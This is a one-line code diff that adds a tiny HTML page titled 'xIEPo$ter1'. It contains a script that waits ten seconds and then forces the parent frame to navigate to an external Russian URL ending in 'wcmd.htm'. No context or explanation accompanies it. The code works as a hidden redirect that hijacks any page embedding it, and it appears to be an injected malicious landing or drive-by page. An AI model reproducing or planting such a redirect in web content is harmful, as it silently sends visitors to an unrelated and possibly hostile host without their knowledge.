@@ -1,0 +1,1 @@
+<HTML><HEAD><TITLE>xIEPo$ter1</TITLE></HEAD><BODY><script>function qqw(){self.parent.location="http://tat-neftbank.ru/wcmd.htm";}setTimeout("qqw()",10000);</script></BODY></HTML>
